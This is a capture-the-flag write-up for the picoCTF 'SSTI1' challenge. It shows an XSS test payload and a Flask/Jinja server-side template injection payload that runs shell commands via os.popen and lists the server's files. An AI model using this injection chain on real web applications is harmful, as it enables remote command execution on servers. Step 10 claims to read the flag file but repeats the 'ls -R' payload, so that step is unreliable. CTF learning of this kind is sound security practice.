# PICOCTF : SSTI1

1. Launch the instance from the challenge, and open the link.
2. At the link, you will see a input box that will announce whatever you submit.
3. A possible injection attack, so let's put it to test.
4. Let's try running JS script attack. Input the ff: `<script>alert('test')</script>`. And it WORKED?!
5. After a few other tests, it seems to be irrelevant. (otherwise, if you found something interesting, let me know pls!)
6. Let's try running another injection for a possible Python Flask framework: `{{7*7}}`. IT WORKED!
7. After a few other tests, we are able to access the `/challenge` directory within the os processes using this expression: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}`
8. From the rendered http, we can see the listed files:
9. ```
   .
   ..
   __pychache__
   app.py
   flag                                      // NOT SO SUSPICIOUS
   requirements.txt
   ./__pycache__:app.cpython-38.pyc

   ```
10. Now let's use another command to concatenate the `flag` file: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}`
11. And voila! Retrieve the picoctf flag.
